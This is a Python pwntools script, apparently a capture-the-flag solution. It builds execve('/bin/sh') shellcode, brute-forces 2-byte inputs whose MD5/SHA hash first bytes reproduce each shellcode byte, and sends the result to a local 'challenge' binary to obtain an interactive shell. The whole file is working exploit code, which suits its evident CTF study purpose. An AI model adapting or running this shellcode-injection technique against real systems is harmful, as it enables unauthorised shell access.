#!/usr/bin/python3
from pwn import *
import hashlib

context.log_level='debug'
context.arch='amd64'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

sc = asm(f'''
lea rdi, [rip+binsh]
xor rdx, rdx
xor rsi, rsi
mov eax, 59
syscall
binsh: .asciz "/bin/sh"
''')

payload = b''
for i, c in enumerate(sc):
    for j in range(2**16): # brute force 2 bytes
        if i % 4 == 0: m = hashlib.md5() # initialize everytime!!!
        elif i % 4 == 1: m = hashlib.sha1()
        elif i % 4 == 2: m = hashlib.sha256()
        elif i % 4 == 3: m = hashlib.sha512()
        m.update(p16(j)) # 2 byte input
        if m.digest()[0] == c: # match found
            payload += p16(j)
            break
    else: 
        log.critical("Hash crack fail") # after all iterations
        exit()

log.info("length: "+str(len(payload)))

p=process('./challenge')

s(p32(len(payload))[::-1]) # big endian
# gdb.attach(p)
sleep(1.0)
s(payload)

p.interactive()
